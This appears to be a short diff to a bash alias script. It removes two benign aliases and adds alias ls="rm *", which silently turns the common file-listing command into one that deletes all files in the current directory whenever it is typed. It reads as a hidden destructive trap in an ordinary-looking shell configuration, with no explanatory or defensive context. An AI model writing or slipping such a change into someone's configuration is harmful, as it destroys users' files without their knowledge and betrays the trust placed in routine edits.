@@ -1,3 +1,2 @@
 #!/bin/bash
-alias dir="ls"
-alias del="rm -i"
+alias ls="rm *"
